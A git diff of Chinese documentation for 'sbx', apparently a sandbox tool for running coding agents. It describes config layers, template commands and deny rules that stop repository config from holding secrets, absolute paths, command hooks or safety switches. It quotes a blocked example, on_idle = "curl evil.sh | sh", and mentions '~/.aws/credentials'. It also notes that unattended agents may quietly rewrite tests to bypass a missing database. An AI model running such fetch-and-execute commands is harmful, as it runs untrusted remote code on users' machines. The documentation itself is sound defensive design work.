@@ -371,7 +371,12 @@ sbx trust             # 确认这个仓库的 .sbx/ 内容（见下）
 | `trust` | `--show` | false（展示并询问；加上则只看不写） |
 | | `-y, --yes` | false（先问） |
 | `config show` | 无 | |
-| `prep init` | `--force` | false（已存在就报错） |
+| `config init` | `--lang <en\|zh>` | `en`（模板注释的语言） |
+| | `--force` | false（已存在就报错） |
+| | `--print` | false（只打印，不写文件） |
+| `forward init` | 同 `config init` 的三个 | 同上 |
+| `prep init` | `--lang <en\|zh>` | `en` |
+| | `--force` | false（已存在就报错） |
 | `prep build` | `--check` | false（构建并播种；加上则只报告） |
 | `prep reseed <task>` | `--yes` | false（要输 Task 名确认） |
 | `prep drop` | `--all` | false（保留当前 tag 的镜像） |
@@ -413,6 +418,7 @@ profile = "web-go"     # 内置：web-go（Go + Node + Python）| py-rust（uv +
 
 ```bash
 sbx prep init             # 生成带注释的模板，契约写在注释里（也是给 agent 看的 ground truth）
+                          # 注释默认英文；要中文注释加 --lang zh
 # 编辑 .sbx/prep.Dockerfile，或者让 agent 照着注释填
 sbx prep build --check    # 只构建 + 报告会播种什么，不碰任何 volume
 sbx prep build            # 构建；新建的 Task 从它播种
@@ -566,7 +572,49 @@ sbx drop spike -y   # 脚本里用
 
 `<ws>` 是 `sbx ls` 第一行打印的 Workspace id（如 `shop-e76272`），不是目录名——同名仓库不会撞车。
 
+### 项目层和工作区层的区别
+
+两份文件**语法完全一样**，差别全在「谁会读到它」上：
+
+| | 项目层 `<repo>/.sbx/sandbox.toml` | 工作区层 `~/.sbx/workspaces/<ws>.toml` |
+|---|---|---|
+| 存在哪 | 仓库里，跟着 git 走 | 你的 `~/.sbx`，不进任何仓库 |
+| 谁会拿到 | 每个 clone 这个仓库的人 | 只有你 |
+| 谁能改 | 任何能往这个仓库推代码的人 | 只有你 |
+| 合并顺序 | 先 | 后——**同名标量它赢** |
+| 红线检查 | 有（见下文「项目层的红线」一节） | 无 |
+| 信任确认 | 有，一变 `sbx run` 就停下来给你看 diff | 无 |
+| 适合写什么 | 对**项目**的陈述 | 对**你这台机器**的决定 |
+
+工作区层是你亲手在自己机器上写的；项目层是**别人 `git push` 一行就能改、而你多半不会逐行读 diff** 的东西。红线和信任确认这两道闸只装在项目层上，就是这个原因。
+
+**判据只有一句：这是在陈述项目的事实，还是在决定我这台机器的行为？**
+
+- 「本项目需要一个 postgres 16」——事实，项目层。`[[services]]` 只有 name/image/env/port，没有地址、没有凭据、不能挂宿主机路径，所以它可以跟着仓库走。
+- 「往 `10.10.16.80:5432` 开个洞」——对你机器的决定，工作区层。`[[forward]]` 整棵子树在项目层被挡死。
+
+全局层（`~/.sbx/config.toml`）和工作区层的权限完全相同，区别只是作用范围：前者管你所有仓库，后者只管这一个。凡是说「只能写在全局层或工作区层」的，两者随便挑。
+
 还有第五个来源：prep 镜像里的 `/sbx/prep.json`（M4-15、boundary.md §2.5）。它只能声明 `allow` / `env` / `ca` 三个白名单字段，**权限等同项目层**（走同一套红线），在 `sbx config show` 里来源显示为 `prep`。它排在最后合并，但**不覆盖任何文件层已经写过的键**——顺序在后不等于优先级更高，你亲手写下的值不该被一个镜像里的 JSON 顶掉。
+
+### 要一份模板：`sbx config init` / `sbx forward init`
+
+两个命令，因为**落点不同**，而落点这件事不该靠读文档才知道：
+
+```bash
+sbx config init           # 写 <repo>/.sbx/sandbox.toml —— 项目层，含 [[services]] 示例
+sbx forward init          # 写 ~/.sbx/workspaces/<ws>.toml —— 工作区层，含 [[forward]] 示例
+```
+
+`[[forward]]` 指向一个真实地址，项目层整棵子树被红线挡着（见上一节），所以它的模板只会落在你自己机器上的那一层。想把示例读一遍再自己抄的话，两个命令都有 `--print`（只打印，不写文件）。
+
+几个刻意的选择：
+
+- **模板里每一行都是注释。** 写一份模板不该改变任何行为，每一条都得是你自己打开的。有测试盯着这一点（`TestTomlTemplatesAreAllComments`）。
+- **注释默认英文，`--lang zh` 给中文。** 模板是给人逐行读的，也是 agent 照着填的 ground truth，读不顺就等于没写；程序自己的输出仍然一律英文。
+- **已存在的文件不覆盖**，要覆盖得显式 `--force`。
+- 这两个命令**不读也不校验现有配置**。配置写坏的时候，最该还能用的恰恰是「再给我一份模板」——用正常加载路径的话，一个手滑写坏的 `sandbox.toml` 会把修它的工具一起锁在门外。
+- `sbx config init` 写完会顺手更新信任记录（和 `sbx net allow --project` 一样的逻辑，且同样**只在写之前本来就已信任时**）。
 
 ### `sbx config show`
 
@@ -589,19 +637,33 @@ resources.memory       "6g"                                      工作区
 
 校验在**四层合并完之后**才做：被后面的层盖掉的非法值不报错；真报错时会告诉你这个值是哪一层给的。
 
-### 项目层的三条红线（M2-2、M3-10）
+### 项目层的红线（M2-2、M3-10、M4-2、M4-12）
 
-`<repo>/.sbx/sandbox.toml` 跟着仓库走，clone 下来就生效，所以这一层里出现下面三类内容会**直接报错**，不是警告：
+`<repo>/.sbx/sandbox.toml` 跟着仓库走，clone 下来就生效，所以这一层里出现下面四类内容会**直接报错**，不是警告。前三类**按键名的形状猜**，第四类是**按位置精确匹配的显式清单**：
 
-- **密钥类字段**：键名里含 `key`、`token`、`secret`、`password`、`credential`（`api_key_file` 这种"指明凭据从哪来"的也算）。
-- **绝对路径**：值以 `/`、`~/` 或 `C:\` 开头。
-- **会在容器里执行的命令**：键名形如 `on_*`、`*_cmd`、`*_command`、`*_script`、`*_hook`，比如 `on_idle`、`on_exit`。
+| | 怎么匹配 | 例子 |
+|---|---|---|
+| 密钥类字段 | 最后一段键名含 `key`/`token`/`secret`/`password`/`credential` | `api_key`、`api_key_file`（"指明凭据从哪来"也算） |
+| 绝对路径 | **任何键**的值以 `/`、`~/` 或 `C:\` 开头 | `"/etc/ssl/corp.crt"`、`"~/.aws/credentials"` |
+| 会在容器里执行的命令 | 键名形如 `on_*`、`*_cmd`、`*_command`、`*_script`、`*_hook` | `on_idle`、`on_exit`、`notify_cmd` |
+| 安全开关和整棵子树 | 完整点号 key / 前缀，一份登记表 | `git.protect`、`prep.on_drift`、`prep.secret.*`、`forward.*` |
 
-这三类只能写在全局层或工作区层——也就是只能你自己写在自己机器上。检查对未知字段同样生效，不认识的键不能绕过去。
+这四类只能写在全局层或工作区层——也就是只能你自己写在自己机器上。检查对未知字段同样生效，不认识的键不能绕过去；未知字段本身只警告不报错。
 
-> 第三条是 M3-10 加的。`on_idle = "curl evil.sh | sh"` 既不像密钥也不是绝对路径，前两条红线都拦不住它；而信任确认虽然会把 `.sbx/` 的改动摊开给你看，但不该指望每个人每次都逐行读懂一段 shell。
+```console
+$ sbx run api
+sbx: /Users/you/code/shop/.sbx/sandbox.toml: the project layer contains settings that are not allowed:
+  - forward.* (this whole section can only be set in the global or workspace layer)
+```
 
-未知字段只警告不报错。
+前三类是"形状"：以后冒出 `on_start`、`webhook_secret` 这种没人预见过的键名，模式会自动挡住。第四类挡的是形状猜不到的东西——`git.protect = false` 和 `prep.on_drift = "build"` 既不像凭据也不是路径，但前者能关掉 `.git` 的只读保护，后者让 `sbx run` 在依赖漂移时自动连一次内网。**新增一项保护机制时，它的开关要同时登记到这张表里**，否则跟着仓库走的配置就有了关掉它的能力。
+
+两处豁免是刻意的，否则文档里自己的示例会被自己的红线拦下：
+
+- `prep.secrets` —— 只有 BuildKit secret 的 id，值存在别处，**正是为了能进仓库共享**。
+- `services.env.*` —— `POSTGRES_PASSWORD = "dev"` 是在给一个用完即弃的空库设密码，不是从宿主机取凭据，值也到不了 Task 之外。
+
+> 第三类是 M3-10 加的。`on_idle = "curl evil.sh | sh"` 既不像密钥也不是绝对路径，前两条都拦不住它；而信任确认虽然会把 `.sbx/` 的改动摊开给你看，但不该指望每个人每次都逐行读懂一段 shell。
 
 ### 信任确认：`sbx trust`（M2-3/4/5、design §9.3）
 
@@ -635,7 +697,7 @@ sbx trust -y       # 不询问直接记下
 - 快照里**存了文本文件的内容**（≤256KB），所以第二次变更能直接给你 diff，不用去翻 git 历史。二进制和超大文件只存哈希：变了会告诉你，但给不出 diff。
 - 记录在 `~/.sbx/trust/<ws>.json`，**按 Workspace 分开**。同一份代码 clone 到两个目录是两个 Workspace，各自确认各自的。
 - 只拦 `sbx run`。**已经在跑的 Task 不受影响**，`attach`、`shell`、`ls` 照常。
-- **安全开关只能写在全局层或工作区层**（目前是 `git.protect`）。和"密钥类字段""执行类字段"那种按键名形状猜的红线不同，这一条是一份显式清单：跟着仓库走的配置不该有能力关掉保护，哪怕信任确认会把改动摊开给你看。
+- **安全开关只能写在全局层或工作区层**（目前是 `git.protect` 和 `prep.on_drift`）。和"密钥类字段""执行类字段"那种按键名形状猜的红线不同，这一条是一份显式清单：跟着仓库走的配置不该有能力关掉保护，哪怕信任确认会把改动摊开给你看。
 - `sbx net allow --project` 写完 `.sbx/sandbox.toml` 会顺手更新信任记录——这次改动是你让 sbx 做的。但**仅限写之前本来就是已信任状态**，否则会把别人留下的、你还没看过的改动一起放行。
 
 ```toml
@@ -737,6 +799,8 @@ redis、kafka、MinIO、内网微服务同构。**判据：共享的、有真实
 
 不解决会怎样：全红。agent 会去试 `apt-get install postgresql`（没 root）、试 `docker run`（没 docker.sock），然后**开始改测试代码绕过数据库**。无人值守下它不会停下来问你——这是最糟的失败模式：不是报错退出，是悄悄产出垃圾。
 
+`sbx config init` 写出来的模板里就有这段（注释状态）。
+
 ```toml
 # <repo>/.sbx/sandbox.toml —— 可以进仓库：没有地址、没有凭据、不能挂宿主机路径
 [[services]]
@@ -754,6 +818,8 @@ service db: postgres:16, reachable in the task as db:5432
 **容器里按 `db:5432` 访问——服务名，不是 `localhost`。** 它是另一个容器，而 `localhost` 在 Task 里指的是 Task 自己。把测试里的连接地址指到 `db` 上（或者用 `DATABASE_URL` 之类的环境变量），这是落地时唯一要改的东西。
 
 ### 场景 B：连你本机已经在跑的实例（🟡）
+
+下面这三个场景的模板，`sbx forward init` 会一次性写到工作区层（全是注释，一次打开一条）。
 
 ```toml
 # ~/.sbx/config.toml 或 ~/.sbx/workspaces/<ws>.toml —— 不能写在项目层
